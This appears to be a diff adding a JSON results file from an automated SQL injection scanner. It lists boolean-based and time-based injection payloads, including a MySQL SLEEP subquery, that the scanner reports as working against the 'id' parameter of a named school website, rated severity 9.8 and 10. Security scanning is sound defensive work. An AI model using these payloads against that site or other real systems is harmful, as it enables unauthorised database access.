@@ -1,0 +1,44 @@
+{
+    "scans": [
+        {
+            "SQL Injection": {
+                "Technique: Boolean": [
+                    {
+                        "Vulnerable URL": "https://dpsgurgaon.org/news-details.php?id=1836",
+                        "Parameter": "id",
+                        "Payload": "' AND (3*3*0)=(2*4*1*0) AND 'Yqjm7Wr4'='Yqjm7Wr4",
+                        "Severity": 9.8
+                    },
+                    {
+                        "Vulnerable URL": "https://dpsgurgaon.org/news-details.php?id=1836",
+                        "Parameter": "id",
+                        "Payload": "' AND (3*3*0)=(2*4*1*0) AND 'P2jFD4ke'='P2jFD4ke",
+                        "Severity": 9.8
+                    }
+                ],
+                "Technique: Time-Based": [
+                    {
+                        "Vulnerable URL": "https://dpsgurgaon.org/news-details.php?id=1836",
+                        "Injected Parameter": "id",
+                        "Payload": "OR (SELECT 7427 FROM (SELECT(SLEEP(3)))rnMX)",
+                        "Payload Title": "MySQL >= 5.0.12 OR time-based blind (query SLEEP)",
+                        "DBMS Detected": "MySQL",
+                        "Web Technology": "Unknown",
+                        "Server Name": "Apache",
+                        "Severity": 10
+                    }
+                ]
+            }
+        },
+        {
+            "SQL Injection": {
+                "Technique: Time-Based": []
+            }
+        },
+        {
+            "SQL Injection": {
+                "Technique: Boolean": []
+            }
+        }
+    ]
+}
